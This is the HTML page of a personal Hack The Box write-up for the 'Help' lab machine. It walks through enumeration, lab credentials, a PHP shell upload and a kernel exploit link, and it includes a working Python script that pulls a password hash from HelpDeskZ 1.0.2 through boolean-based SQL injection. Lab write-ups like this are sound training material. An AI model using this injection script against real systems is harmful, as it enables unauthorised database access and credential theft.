@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Help | whoami</title>
+<meta name="keywords" content="">
+<meta name="description" content="Easy Linux">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/htb/help-easy-linux/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/htb/help-easy-linux/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="http://localhost:1313/htb/help-easy-linux/">
+  <meta property="og:site_name" content="whoami">
+  <meta property="og:title" content="Help">
+  <meta property="og:description" content="Easy Linux">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="htb">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Help">
+  <meta name="twitter:description" content="Easy Linux">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Hack The Box",
+      "item": "http://localhost:1313/htb/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Help",
+      "item": "http://localhost:1313/htb/help-easy-linux/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Help",
+  "name": "Help",
+  "description": "Easy Linux",
+  "keywords": [
+    
+  ],
+  "articleBody": "nmap scan Going to port 80 shows default Apache page Going to port 3000 is a json response - seems like some API Fuzzing finds help.htb/support : Help Desk Z is an open source software and github repo is at https://github.com/helpdesk-z/helpdeskz-dev/blob/master/.htaccess The version in the github repo doesn’t seem to have many vulnerabilities but there are some vulnerabilities for older versions. I haven’t been able to determine what version this one at help.htb/support is.\nLets look deeper into help.htb:3000\nThe headers show some interesting stuff - Express and then an ETag. Googling Express, it seems to be Express.js which is a minimalist web framework for Node.js.\nHad to get some help for the endpoint above, especially considering its not in fuzzing directories? Need to watch Ippsec video maybe for better understanding on how to find this\nLets continue.\nUsing the stack traces and context of the original message telling “Shiv” that credentials can be queried helpme@helpme.com godhelpmeplz Entering the credentials into the website, an error message appears.\nOh that was weird, I just tried again and it worked - oh well lets continue.\nThere is a file upload and it seems the vulnerability is here somewhere.\nOkay somehow, we are supposed to be able to figure out the version of the software is 1.0.2 but I have no idea how that was found? But ill see when I watch the video. This might be something to do with the box being old as now there is a much newer version of the software.\nOkay so I watched the video because this whole path has sort of been a bit off.\nWe see that based on the github repo structure - there may be a README.md: Going to http://help.htb/support/README.md , there is in fact a README.md we can download\nThis shows us that the version is in fact 1.0.2 It seems that you can upload .php, even though we get that error page - it seems the php file does get uploaded. The filename is obfuscated but the exploit shows it is related to time.\nSo lets upload a shell - and then run this python script\nOkay for some reason this exploit doesn’t work - lets look into the SQL injection one (even though it worked in Ippsec video)\nThe actual exploit script is broken but following along, we see we have to go to the attachment download link\nWe see that adding AND 1=1– still gives us the file but AND 1=0– doesn’t:\nSo there is boolean-based sql injection, putting this into sqlmap results in a success and able to enumerate and find database, tables, columns…etc. This is very slow - we can probably guess the table “staff”\nWe are able to see that there is a username and password column “admin” is the username we can write a script to enumerate the password OR I just try to fix the exploit script. I’m gonna try just fix the exploit script first by putting in the correct endpoints\nnvm the exploit is so broken\nimport requests cookies = { \"lang\":\"english\", \"PHPSESSID\":\"ffje9vbg4hlf1bbdfdie8s1044\", \"usrhash\":\"0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BH%2FjKDEz253n6ozUnIWcCOKmu9g60CEJ9QKffVBfX%2FmCQ%3D%3D\" } hash_characters = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0'] password_hash = \"\" for i in range(1,41): # SHA1 hash it seems? From HelpDeskZ 1.0.2 github for char in hash_characters: response = requests.get(f\"http://help.htb/support/?v=view_tickets\u0026action=ticket\u0026param[]=7\u0026param[]=attachment\u0026param[]=4\u0026param[]=9+and+substr((select+(password)+from+staff+limit+0,1),{i},1)+%3d+'{char}'--\", cookies=cookies) if \"Page not found - 404\" in str(response.content): continue else: password_hash += char print(f\"Password hash: {password_hash}\") break I coded the above to use the boolean based to determine the password hash\nThe hash is taking ages to get - OMG I FIGURED OUT WHY THE SHELL UPLOAD DIDNT WORK I gave the exploit the wrong base url\nHell yeah, fuck the hash method its too slow Basic enumeration This kernel is vulnerable as it is old and running the exploit https://www.exploit-db.com/exploits/44298 gives us root\n",
+  "wordCount" : "625",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/htb/help-easy-linux/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "whoami",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="whoami (Alt + H)">whoami</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="http://localhost:1313/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/projects/" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/htb/" title="HTB">
+                    <span>HTB</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Help
+    </h1>
+    <div class="post-description">
+      Easy Linux
+    </div>
+  </header> 
+  <div class="post-content md-content"><p>nmap scan
+<img alt="Help (Easy Linux).png" loading="lazy" src="/htb/help-easy-linux/Help%20%28Easy%20Linux%29.png"></p>
+<p>Going to port 80 shows default Apache page
+<img alt="Help (Easy Linux)-1.png" loading="lazy" src="/htb/help-easy-linux/Help%20%28Easy%20Linux%29-1.png">
+Going to port 3000 is a json response - seems like some API
+<img alt="Help (Easy Linux)-2.png" loading="lazy" src="/htb/help-easy-linux/Help%20%28Easy%20Linux%29-2.png">
+Fuzzing finds help.htb/support :
+<img alt="Help (Easy Linux)-3.png" loading="lazy" src="/htb/help-easy-linux/Help%20%28Easy%20Linux%29-3.png"></p>
+<p>Help Desk Z is an open source software and github repo is at <a href="https://github.com/helpdesk-z/helpdeskz-dev/blob/master/.htaccess">https://github.com/helpdesk-z/helpdeskz-dev/blob/master/.htaccess</a>
+The version in the github repo doesn&rsquo;t seem to have many vulnerabilities but there are some vulnerabilities for older versions. I haven&rsquo;t been able to determine what version this one at help.htb/support is.</p>
+<p>Lets look deeper into help.htb:3000</p>
+<p><img alt="Help (Easy Linux)-4.png" loading="lazy" src="/htb/help-easy-linux/Help%20%28Easy%20Linux%29-4.png"></p>
+<p>The headers show some interesting stuff - Express and then an ETag. Googling Express, it seems to be Express.js which is a minimalist web framework for Node.js.</p>
+<p><img alt="Help (Easy Linux)-5.png" loading="lazy" src="/htb/help-easy-linux/Help%20%28Easy%20Linux%29-5.png"></p>
+<p>Had to get some help for the endpoint above, especially considering its not in fuzzing directories? Need to watch Ippsec video maybe for better understanding on how to find this</p>
+<p>Lets continue.</p>
+<p>Using the stack traces and context of the original message telling &ldquo;Shiv&rdquo; that credentials can be queried
+<img alt="Help (Easy Linux)-6.png" loading="lazy" src="/htb/help-easy-linux/Help%20%28Easy%20Linux%29-6.png">
+<img alt="Help (Easy Linux)-8.png" loading="lazy" src="/htb/help-easy-linux/Help%20%28Easy%20Linux%29-8.png">
+<code>helpme@helpme.com</code>
+<code>godhelpmeplz</code>
+Entering the credentials into the website, an error message appears.</p>
+<p><img alt="Help (Easy Linux)-9.png" loading="lazy" src="/htb/help-easy-linux/Help%20%28Easy%20Linux%29-9.png"></p>
+<p>Oh that was weird, I just tried again and it worked - oh well lets continue.</p>
+<p>There is a file upload and it seems the vulnerability is here somewhere.</p>
+<p>Okay somehow, we are supposed to be able to figure out the version of the software is 1.0.2 but I have no idea how that was found? But ill see when I watch the video. This might be something to do with the box being old as now there is a much newer version of the software.</p>
+<p>Okay so I watched the video because this whole path has sort of been a bit off.</p>
+<p>We see that based on the github repo structure - there may be a README.md:
+<img alt="Help (Easy Linux)-10.png" loading="lazy" src="/htb/help-easy-linux/Help%20%28Easy%20Linux%29-10.png">
+Going to <a href="http://help.htb/support/README.md">http://help.htb/support/README.md</a> , there is in fact a README.md we can download</p>
+<p>This shows us that the version is in fact 1.0.2
+<img alt="Help (Easy Linux)-11.png" loading="lazy" src="/htb/help-easy-linux/Help%20%28Easy%20Linux%29-11.png">
+<img alt="Help (Easy Linux)-12.png" loading="lazy" src="/htb/help-easy-linux/Help%20%28Easy%20Linux%29-12.png"></p>
+<p>It seems that you can upload .php, even though we get that error page - it seems the php file does get uploaded. The filename is obfuscated but the exploit shows it is related to time.</p>
+<p>So lets upload a shell - and then run this python script</p>
+<p>Okay for some reason this exploit doesn&rsquo;t work - lets look into the SQL injection one
+(even though it worked in Ippsec video)</p>
+<p>The actual exploit script is broken but following along, we see we have to go to the attachment download link</p>
+<p><img alt="Help (Easy Linux)-14.png" loading="lazy" src="/htb/help-easy-linux/Help%20%28Easy%20Linux%29-14.png"></p>
+<p>We see that adding AND 1=1&ndash; still gives us the file but AND 1=0&ndash; doesn&rsquo;t:</p>
+<p><img alt="Help (Easy Linux)-15.png" loading="lazy" src="/htb/help-easy-linux/Help%20%28Easy%20Linux%29-15.png"></p>
+<p>So there is boolean-based sql injection, putting this into sqlmap results in a success and able to enumerate and find database, tables, columns&hellip;etc. This is very slow - we can probably guess the table &ldquo;staff&rdquo;</p>
+<p>We are able to see that there is a username and password column
+<img alt="Help (Easy Linux)-16.png" loading="lazy" src="/htb/help-easy-linux/Help%20%28Easy%20Linux%29-16.png"></p>
+<p>&ldquo;admin&rdquo; is the username
+<img alt="Help (Easy Linux)-17.png" loading="lazy" src="/htb/help-easy-linux/Help%20%28Easy%20Linux%29-17.png"></p>
+<p>we can write a script to enumerate the password OR I just try to fix the exploit script. I&rsquo;m gonna try just fix the exploit script first by putting in the correct endpoints</p>
+<p>nvm the exploit is so broken</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;lang&#34;</span><span class="p">:</span><span class="s2">&#34;english&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;PHPSESSID&#34;</span><span class="p">:</span><span class="s2">&#34;ffje9vbg4hlf1bbdfdie8s1044&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;usrhash&#34;</span><span class="p">:</span><span class="s2">&#34;0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ</span><span class="si">%2F</span><span class="s2">iYFsjV6wVnLIF</span><span class="si">%2F</span><span class="s2">aNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BH</span><span class="si">%2F</span><span class="s2">jKDEz253n6ozUnIWcCOKmu9g60CEJ9QKffVBfX</span><span class="si">%2F</span><span class="s2">mCQ%3D%3D&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">hash_characters</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="p">,</span><span class="s1">&#39;c&#39;</span><span class="p">,</span><span class="s1">&#39;d&#39;</span><span class="p">,</span><span class="s1">&#39;e&#39;</span><span class="p">,</span><span class="s1">&#39;f&#39;</span><span class="p">,</span><span class="s1">&#39;g&#39;</span><span class="p">,</span><span class="s1">&#39;h&#39;</span><span class="p">,</span><span class="s1">&#39;i&#39;</span><span class="p">,</span><span class="s1">&#39;j&#39;</span><span class="p">,</span><span class="s1">&#39;k&#39;</span><span class="p">,</span><span class="s1">&#39;l&#39;</span><span class="p">,</span><span class="s1">&#39;m&#39;</span><span class="p">,</span><span class="s1">&#39;n&#39;</span><span class="p">,</span><span class="s1">&#39;o&#39;</span><span class="p">,</span><span class="s1">&#39;p&#39;</span><span class="p">,</span><span class="s1">&#39;q&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">,</span><span class="s1">&#39;s&#39;</span><span class="p">,</span><span class="s1">&#39;t&#39;</span><span class="p">,</span><span class="s1">&#39;u&#39;</span><span class="p">,</span><span class="s1">&#39;v&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">,</span><span class="s1">&#39;x&#39;</span><span class="p">,</span><span class="s1">&#39;y&#39;</span><span class="p">,</span><span class="s1">&#39;z&#39;</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">,</span><span class="s1">&#39;2&#39;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="p">,</span><span class="s1">&#39;4&#39;</span><span class="p">,</span><span class="s1">&#39;5&#39;</span><span class="p">,</span><span class="s1">&#39;6&#39;</span><span class="p">,</span><span class="s1">&#39;7&#39;</span><span class="p">,</span><span class="s1">&#39;8&#39;</span><span class="p">,</span><span class="s1">&#39;9&#39;</span><span class="p">,</span><span class="s1">&#39;0&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">password_hash</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">41</span><span class="p">):</span> <span class="c1"># SHA1 hash it seems? From HelpDeskZ 1.0.2 github</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">hash_characters</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;http://help.htb/support/?v=view_tickets&amp;action=ticket&amp;param[]=7&amp;param[]=attachment&amp;param[]=4&amp;param[]=9+and+substr((select+(password)+from+staff+limit+0,1),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1)+%3d+&#39;</span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="s2">&#39;--&#34;</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;Page not found - 404&#34;</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">password_hash</span> <span class="o">+=</span> <span class="n">char</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Password hash: </span><span class="si">{</span><span class="n">password_hash</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span></code></pre></div><p>I coded the above to use the boolean based to determine the password hash</p>
+<p>The hash is taking ages to get - OMG I FIGURED OUT WHY THE SHELL UPLOAD DIDNT WORK
+I gave the exploit the wrong base url</p>
+<p><img alt="Help (Easy Linux)-18.png" loading="lazy" src="/htb/help-easy-linux/Help%20%28Easy%20Linux%29-18.png"></p>
+<p>Hell yeah, fuck the hash method its too slow
+<img alt="Help (Easy Linux)-19.png" loading="lazy" src="/htb/help-easy-linux/Help%20%28Easy%20Linux%29-19.png"></p>
+<p>Basic enumeration
+<img alt="Help (Easy Linux)-21.png" loading="lazy" src="/htb/help-easy-linux/Help%20%28Easy%20Linux%29-21.png"></p>
+<p>This kernel is vulnerable as it is old and running the exploit <a href="https://www.exploit-db.com/exploits/44298">https://www.exploit-db.com/exploits/44298</a> gives us root</p>
+<p><img alt="Help (Easy Linux)-20.png" loading="lazy" src="/htb/help-easy-linux/Help%20%28Easy%20Linux%29-20.png"></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">whoami</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
